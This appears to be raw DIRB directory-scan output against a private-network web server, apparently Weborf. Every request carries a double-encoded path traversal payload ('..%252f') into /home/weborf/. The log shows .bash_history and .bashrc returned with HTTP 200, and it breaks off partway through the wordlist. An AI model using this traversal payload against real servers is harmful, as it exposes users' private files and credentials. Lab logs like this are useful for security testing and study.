
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jul  5 01:20:13 2025
URL_BASE: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

*** Generating Wordlist...
                                                                               
GENERATED WORDS: 4612

---- Scanning URL: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/ ----
*** Calculating NOT_FOUND code...
                                                                               
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.bash_history
                                                                                                                                                                                             
+ http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.bash_history (CODE:200|SIZE:380)
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.bashrc
                                                                                                                                                                                             
+ http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.bashrc (CODE:200|SIZE:3526)
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.cache
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/.config
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_config
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_css
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_data
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_database
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_db_backups
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_derived
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_dev
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_dummy
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_files
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_flash
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_fpclass
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_images
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_img
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_inc
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_include
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_includes
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_install
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_js
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_layouts
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_lib
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_media
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_mem_bin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_mm
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_mmserverscripts
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_mygallery
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_net
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_notes
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_old
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_overlay
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_pages
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_private
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_reports
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_res
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_resources
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_scriptlibrary
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_scripts
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_source
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_src
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_stats
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_styles
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_swf
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_temp
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_tempalbums
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_template
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_templates
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_test
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_themes
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_tmp
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_tmpfileop
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_vti_aut
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_vti_bin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_vti_bin/_vti_adm/admin.dll
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_vti_bin/_vti_aut/author.dll
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_vti_bin/shtml.dll
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_vti_cnf
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_vti_inf
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_vti_log
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_vti_map
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_vti_pvt
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_vti_rpc
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_vti_script
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_vti_txt
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/_www
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~adm
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~admin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~administrator
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~amanda
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~apache
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~bin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~ftp
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~guest
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~http
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~httpd
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~log
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~logs
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~lp
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~mail
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~nobody
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~operator
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~root
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~sys
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~sysadm
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~sysadmin
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~test
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~tmp
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~user
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~webmaster
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/~www
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/0
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/00
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/01
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/02
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/03
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/04
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/05
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/06
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/07
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/08
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/09
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/1
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/10
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/100
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/1000
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/1001
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/101
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/102
                                                                                                                                                                                             
--> Testing: http://192.168.100.84:8080/..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome%252fweborf%252f/103
                                                                                                                                                                                             
